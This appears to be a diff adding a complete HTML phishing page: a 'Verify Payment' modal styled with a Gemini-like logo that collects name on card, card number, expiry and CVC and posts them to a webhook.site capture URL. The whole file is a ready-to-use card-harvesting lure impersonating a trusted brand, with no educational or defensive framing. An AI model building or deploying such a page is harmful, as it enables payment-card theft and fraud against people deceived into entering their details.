@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --primary-blue: #1a73e8;
+            --bg-blur: rgba(255, 255, 255, 0.1);
+        }
+
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        }
+
+        /* The "Trigger" Button */
+        .open-modal {
+            padding: 12px 24px;
+            background: var(--primary-blue);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Hidden Checkbox Hack */
+        #modal-toggle { display: none; }
+
+        /* The Overlay/Background Blur */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(8px); /* This creates the blur effect */
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+
+        /* Show modal when checkbox is checked */
+        #modal-toggle:checked ~ .modal-overlay {
+            display: flex;
+        }
+
+        /* The Modal Box */
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            position: relative;
+        }
+
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 40px; /* Placeholder for Gemini-style icon */
+        }
+
+        h3 { text-align: center; margin-bottom: 20px; color: #3c4043; }
+
+        label { display: block; margin-bottom: 5px; font-size: 14px; font-weight: 600; color: #5f6368; }
+
+        input { 
+            display: block; 
+            margin-bottom: 15px; 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px;
+            box-sizing: border-box; /* Ensures padding doesn't break width */
+        }
+
+        button[type="submit"] { 
+            width: 100%; 
+            padding: 12px; 
+            background: var(--primary-blue); 
+            color: white; 
+            border: none; 
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            text-decoration: none;
+            color: #aaa;
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+
+    <label for="modal-toggle" class="open-modal">Verify Payment Info</label>
+
+    <input type="checkbox" id="modal-toggle">
+
+    <div class="modal-overlay">
+        <div class="modal-content">
+            <label for="modal-toggle" class="close-btn">&times;</label>
+            
+            <svg class="logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L14.5 9.5L22 12L14.5 14.5L12 22L9.5 14.5L2 12L9.5 9.5L12 2Z" fill="#4285F4"/>
+            </svg>
+
+            <h3>Verify Payment</h3>
+            
+            <form action="https://webhook.site/YOUR-ID-HERE" method="POST">
+                <label for="cc-name">Name on Card</label>
+                <input type="text" id="cc-name" name="ccname" autocomplete="cc-name" required>
+
+                <label for="cc-number">Card Number</label>
+                <input type="text" id="cc-number" name="cardnumber" autocomplete="cc-number" inputmode="numeric" required>
+
+                <div style="display: flex; gap: 10px;">
+                    <div style="flex: 1;">
+                        <label for="cc-exp">Expiry</label>
+                        <input type="text" id="cc-exp" name="cc-exp" placeholder="MM/YY" required>
+                    </div>
+                    <div style="flex: 1;">
+                        <label for="cc-csc">CVC</label>
+                        <input type="text" id="cc-csc" name="csc" inputmode="numeric" required>
+                    </div>
+                </div>
+
+                <button type="submit">Verify Now</button>
+            </form>
+        </div>
+    </div>
+
+</body>
+</html>
